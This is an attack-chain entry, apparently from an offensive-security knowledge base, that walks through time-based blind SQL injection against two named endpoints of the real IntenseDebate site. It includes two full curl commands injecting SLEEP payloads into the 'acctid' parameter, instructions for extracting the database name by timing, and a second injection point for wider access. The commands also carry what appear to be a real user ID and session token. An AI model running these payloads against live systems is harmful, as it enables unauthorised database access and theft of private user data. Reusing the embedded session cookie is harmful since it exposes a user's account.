---
id: ac-sqli-intensedebate-001
tags:
  - sqli
  - blind-sqli
  - time-based
  - mysql
  - php
  - web-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-SQL-Injection-in-changeReplaceOpt]]'
  - '[[procedures/Confirm-Time-Based-SQLi-with-SLEEP-15]]'
  - '[[procedures/Confirm-Time-Based-SQLi-with-SLEEP-7]]'
  - '[[procedures/Extract-Database-Name-via-Blind-SQLi]]'
  - '[[procedures/Exploit-SQL-Injection-in-commentAction]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:04.964Z'
description: >-
  A multi-stage attack exploiting time-based blind SQL injection vulnerabilities
  in two endpoints of intensedebate.com to confirm injection points, extract
  database names, and potentially access private user information.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Time-Based Blind SQL Injection in IntenseDebate Leading to Database Access and User Data Exposure

Multi-stage attack chain demonstrating the discovery and exploitation of time-based blind SQL injection vulnerabilities in the IntenseDebate platform, allowing attackers to confirm injection points, extract database metadata, and potentially retrieve sensitive user data from the MySQL backend.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~30 seconds (due to sleep delays) |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Vulnerable Endpoint] --> B[Confirm SQLi with SLEEP(15)]
    B --> C[Confirm SQLi with SLEEP(7)]
    C --> D[Extract Database Name]
    D --> E[Exploit Second Endpoint for Full Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser or HTTP client like curl
- Burp Suite or similar for intercepting requests (optional)

### Target Environment

- Web platform running PHP with MySQL backend
- Accessible public-facing endpoints: https://www.intensedebate.com/changeReplaceOpt.php and https://intensedebate.com/js/commentAction/
- No authentication required for initial testing

### Initial Access Requirements

- Direct internet access to the target domain
- No prior credentials needed; exploits public endpoints

## Detailed Attack Procedures

### Step 1: Identify Vulnerable Endpoint
procedure: [[procedures/Identify-SQL-Injection-in-changeReplaceOpt]]

**Objective**: Locate the /changeReplaceOpt.php endpoint and test the 'acctid' parameter for SQL injection susceptibility.

**Instructions**: Target the endpoint https://www.intensedebate.com/changeReplaceOpt.php with a basic GET request including the acctid parameter. Observe for any anomalous behavior indicating lack of sanitization.

**Expected Output**: Normal response without errors, but sets up for injection testing.

**Success Indicators**:
- Endpoint responds without 404 or access denial
- Parameter is accepted in the query

### Step 2: Confirm Time-Based SQLi with SLEEP(15)
procedure: [[procedures/Confirm-Time-Based-SQLi-with-SLEEP-15]]

**Objective**: Inject a SLEEP(15) payload to induce a detectable delay, confirming blind time-based SQL injection.

**Instructions**: Send an HTTP GET request using [[commands/sqli-sleep-15-change-replace-opt]] to inject the payload into acctid:

```bash
curl -X GET "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523 AND SLEEP(15)" -H "Host: www.intensedebate.com" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0" -H "Accept: */*" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Referer: https://www.intensedebate.com/install-t" -H "Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572"
```

Compare response time to a baseline request without the payload.

**Expected Output**: Response delayed by approximately 15 seconds (e.g., 15,414 ms).

**Success Indicators**:
- Significant delay in response time
- No error messages; blind confirmation via timing

### Step 3: Confirm Time-Based SQLi with SLEEP(7)
procedure: [[procedures/Confirm-Time-Based-SQLi-with-SLEEP-7]]

**Objective**: Use a shorter SLEEP(7) payload for additional verification of the injection point.

**Instructions**: Execute [[commands/sqli-sleep-7-change-replace-opt]] to inject the payload:

```bash
curl -X GET "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523 AND SLEEP(7)" -H "Host: www.intensedebate.com" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0" -H "Accept: */*" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Referer: https://www.intensedebate.com/install-t" -H "Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572"
```

Measure the response time against baseline.

**Expected Output**: Response delayed by about 7 seconds (e.g., 7,486 ms).

**Success Indicators**:
- Consistent delay matching sleep duration
- Confirms MySQL SLEEP function execution

### Step 4: Extract Database Name via Blind SQLi
procedure: [[procedures/Extract-Database-Name-via-Blind-SQLi]]

**Objective**: Use conditional SQL payloads to enumerate the database name through timing differences.

**Instructions**: Craft payloads using SQL functions like database() combined with SLEEP or IF statements to leak information bit by bit. For example, test substrings of the database name with time-based conditions.

**Expected Output**: Inferred database name 'id_commxn2s' from successful delay patterns.

**Success Indicators**:
- Delays confirm character matches in database name
- Full name reconstructed via multiple queries

### Step 5: Exploit Second SQLi in Comment Action Endpoint
procedure: [[procedures/Exploit-SQL-Injection-in-commentAction]]

**Objective**: Identify and confirm a similar vulnerability in the nested 'data['params']['acctid']' parameter for broader access.

**Instructions**: Target https://intensedebate.com/js/commentAction/ with JSON-like data parameter using [[commands/sqli-comment-action-injection]]. Inject SLEEP payloads in the nested acctid field and observe delays.

**Expected Output**: Delayed responses (e.g., 7s and 15s as per attachments) confirming injection.

**Success Indicators**:
- Time delays in second endpoint
- Potential for full DB dump via chained blind techniques

## Attack Chain Summary

### Key Achievements

1. Confirmed two time-based blind SQLi points in public endpoints
2. Extracted database name 'id_commxn2s'
3. Enabled potential exfiltration of private user data

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---

*Last updated: 2023-10-01T00:00:00Z*
